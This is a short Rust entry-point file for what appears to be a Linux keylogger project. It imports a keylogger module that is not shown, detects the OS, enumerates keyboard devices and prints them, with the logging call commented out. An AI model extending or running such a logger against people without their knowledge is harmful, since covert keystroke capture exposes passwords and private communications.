use std::env::consts;

mod common;
mod linux;

use common::Common;
use linux::keylogger::Keylogger as LinuxKeyLog;

fn main() {
    let os = consts::FAMILY;
    let kl: Box<dyn Common>;

    kl = if os.contains("windows") { panic!("sznioooo") } else { Box::new( LinuxKeyLog { } ) };

    let kbds = kl.find_keyboard();
    println!("{:?}", kbds);
    // kl.start_logging();
}
